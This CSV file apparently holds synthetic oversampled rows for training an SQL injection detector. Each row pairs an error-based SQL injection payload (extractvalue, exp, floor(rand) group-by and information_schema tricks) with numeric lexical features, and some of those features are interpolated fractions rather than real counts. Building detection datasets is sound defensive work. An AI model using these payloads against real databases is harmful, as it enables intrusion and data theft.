id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000011,attack,error,"1'   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  'wnzv'  =  'wnzv",nearest_attack_euclidean,R000268,0.09277258046855721,241.89463273167837,31.11053672683216,3.7080869586534058,77.0,37.0,99.1157061853427,28.778926546335676,0.31837569154631423,0.15298572191186527,0.40967967166270053,0.11895891487912001,4.0,0.0,0.0,0.0,0.0,2.0,0.0,17.778926546335676,0.0,0.0,5.0,2.0,1.0,-2.7755575615628914e-17,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_000012,attack,error,"1%""  )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000065,0.06348033233443229,277.1670870321161,36.0,3.933621281608179,100.0,35.0,104.33366962569289,37.83341740642322,0.3608301741757273,0.12629056096150457,0.37638537551769613,0.136493889345072,0.0,4.0,0.0,0.0,2.0,2.0,0.0,19.833417406423223,2.0,2.0,5.0,4.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.0
SMOTE_000013,attack,error,"1""  )   as hoiv where 9708  =  9708 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",nearest_attack_euclidean,R000110,0.14880681977722074,207.13903302524722,33.48815701082023,3.6702213238378123,55.0,40.0,85.97631402164046,26.162719003606743,0.26556254121909395,0.1931363936138865,0.4149984703339241,0.12630259483309544,0.0,1.0,2.0,0.0,1.0,2.0,0.0,15.162719003606743,0.0,0.0,4.0,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000014,attack,error,"1'  )   where 9544  =  9544 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",nearest_attack_euclidean,R000089,0.046619150312490074,197.60745683972544,32.92406789503432,3.6418988431268176,48.45559262979408,40.0,83.15186420993136,26.0,0.24515522643958435,0.2024440194728484,0.42081214143021584,0.13158861265735144,1.0,0.0,2.0,0.0,1.0,2.0,0.0,15.0,0.0,0.0,4.0,5.0,1.0,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,1.0,1.0,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000015,attack,error,"1 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  ",nearest_attack_euclidean,R000132,0.32637406738237157,290.6215303201268,37.126156559957735,3.9580650136164612,98.6215303201268,55.0,106.74768688008453,30.25231311991547,0.3393391301721118,0.18925181166944713,0.36730471002590487,0.10410434813253625,0.12615655995773434,0.0,0.0,0.0,2.0,1.0,0.0,20.0,0.0,0.0,6.126156559957735,4.0,0.12615655995773456,-2.7755575615628914e-17,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,0.8738434400422654,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,12.873843440042265
SMOTE_000016,attack,error,1' and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  ) ,nearest_attack_euclidean,R000182,0.04542226601191147,331.9852994182337,29.0,3.2405385632839727,74.95589825470098,44.94119767293465,155.0735029088317,57.014700581766334,0.2257804095311142,0.13537053792445117,0.4671102678621365,0.1717387846822981,0.9852994182336617,0.0,0.0,0.0,0.0,1.9852994182336614,0.0,32.029401163532675,0.0,0.0,0.014700581766338594,21.985299418233666,0.9852994182336616,-2.7755575615628914e-17,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.1102230246251565e-16,0.9852994182336616,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,4.985299418233662
SMOTE_000017,attack,error,"1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj",nearest_attack_euclidean,R000189,0.5617395682799422,191.34419380482603,31.0,3.6704446831148627,55.37677521930419,32.0,78.3116123903479,25.655806195173952,0.2893863874734537,0.16723892338147814,0.4092857399644195,0.13408894918064868,4.0,0.0,0.0,0.0,1.0,1.6558061951739522,0.0,14.0,0.0,0.0,4.0,2.6558061951739522,1.0,-2.7755575615628914e-17,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000018,attack,error,"1'  )   as mvai where 5856  =  5856 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",nearest_attack_euclidean,R000037,0.36434120242917306,200.04801132943805,33.08430943529816,3.685634808910116,52.252928305894486,40.0,82.25292830589449,25.54215471764908,0.2609905580737253,0.2001629746672991,0.4111127890741996,0.12773367818477593,1.0,0.0,2.0,0.0,1.0,2.0,0.0,14.54215471764908,0.0,0.0,4.0,5.0,1.0,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000019,attack,error,"1""  )   as ltoa where 9159  =  9159 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",nearest_attack_euclidean,R000232,0.29582058312577114,199.22134523325462,32.44451190513426,3.664378280924182,51.332928569194436,40.0,82.33292856919444,25.555488094865737,0.2574516695652721,0.20099456785238354,0.41322245965086934,0.12833130293147502,0.0,1.0,2.0,0.0,1.0,2.0,0.0,14.55548809486574,0.0,0.0,4.0,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,1.0,1.0,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000020,attack,error,"1%""  )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000117,0.7959327431913841,320.6346188983605,38.30897459322403,3.9133647168772487,101.30897459322404,55.0,124.70769511868838,39.617949186448065,0.31607842998512736,0.17161359861361977,0.38875141277681663,0.12355655862443621,0.0,4.0,0.0,0.0,2.0,2.0,0.0,22.617949186448065,2.0,0.0,6.0,5.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,1.3089745932240322,0.691025406775968,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000021,attack,error,"1""  )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  ""imlx""  =  ""imlx",nearest_attack_euclidean,R000064,0.3428282796790927,288.7502321952589,35.0,3.9194519366293408,108.0,35.0,109.0716275959362,36.6786045993227,0.3742198568261655,0.12127495360107216,0.37748804065535135,0.12701714891741098,0.0,4.0,0.0,0.0,2.0,2.0,0.0,20.6786045993227,0.0,2.0,5.0,4.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.0
SMOTE_000022,attack,error,"1'   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   'adnz'  =  'adnz",nearest_attack_euclidean,R000261,0.6491004518873006,327.6101117587883,38.608754656616185,3.948315050584638,110.0,55.0,125.17509313232362,37.435018626464725,0.33620166386868994,0.16810083193434497,0.3814986729522304,0.11419883124473475,4.0,0.0,0.0,0.0,2.0,2.0,0.0,22.435018626464725,0.0,0.0,6.0,5.0,1.0,-2.7755575615628914e-17,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000023,attack,error,"1%'   )    )     )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000230,0.9614018916939587,191.76944625378786,28.395635179112553,3.4475910284885645,42.76944625378788,33.813094462662335,85.7912703582251,29.395635179112553,0.22277959971424235,0.176512909906074,0.44741785892810104,0.15328963145158256,4.0,0.0,0.0,0.0,0.39563517911255464,2.0,0.0,16.0,2.0,0.0,4.6043648208874455,2.3956351791125545,1.0,-2.7755575615628914e-17,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.7912703582251093,0.0,0.0,0.39563517911255475,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.186905537337664
SMOTE_000024,attack,error,"1%"" and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and ""%""  =  """,nearest_attack_euclidean,R000308,0.5486835899880262,269.9456527099833,36.21618363444259,3.98092131685356,99.78381636555741,35.0,98.72946907554072,36.43236726888518,0.369732980157485,0.12967969927192446,0.36564159436629845,0.1349457262042921,0.0,4.0,0.0,0.0,2.0,2.0,0.0,18.43236726888518,2.0,2.0,5.0,4.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,2.0,1.7838163655574106,0.21618363444258948,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.0
SMOTE_000025,attack,error,"-9740""   )    )    as pxkx where 5305  =  5305 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000264,0.19969581120619034,238.2532711497011,40.931331778742525,3.919261854831239,73.2446495661678,44.45065422994022,95.76397201736549,24.79399533622758,0.30749196920725336,0.186540543499908,0.4018403822106083,0.10412710508223035,0.0,1.0,1.0,0.0,1.0,1.9313317787425275,0.0,15.862663557485055,0.0,0.0,3.0,3.9313317787425275,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.9313317787425275,1.1102230246251565e-16,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,6.9313317787425275
